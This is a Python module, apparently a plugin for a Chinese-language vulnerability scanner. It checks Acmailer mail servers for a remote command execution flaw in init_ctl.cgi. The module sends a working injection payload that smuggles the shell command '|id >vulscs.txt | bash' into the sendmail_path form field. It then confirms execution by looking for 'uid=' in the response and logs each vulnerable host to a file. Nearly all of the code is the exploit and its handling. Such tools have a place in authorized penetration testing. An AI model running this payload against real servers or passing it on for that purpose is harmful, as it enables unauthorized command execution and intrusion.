#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Acmailer_Rce_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/init_ctl.cgi"
            data = "admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id >vulscs.txt | bash&homeurl=http://&mypath=e"
            req = requests.post(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,data=data)
            req2 = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)

            if "uid=" in req2.text:
                if not self.batch:
                    OutPrintInfoSuc("Acmailer", '目标存在Acmailer邮件系统init_ctl.cgi远程命令执行漏洞')
                    OutPrintInfo("Acmailer", url)
                else:
                    OutPrintInfoSuc("Acmailer", f'目标存在Acmailer邮件系统init_ctl.cgi远程命令执行漏洞: {url}')
                    OutPutFile("acmailer_rce.txt",f'目标存在Acmailer邮件系统init_ctl.cgi远程命令执行漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Acmailer", f'目标 {input_url} 不存在Acmailer邮件系统init_ctl.cgi远程命令执行漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Acmailer",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Acmailer", '开始检测Acmailer邮件系统init_ctl.cgi远程命令执行漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Acmailer", 'Acmailer邮件系统init_ctl.cgi远程命令执行漏洞检测结束')


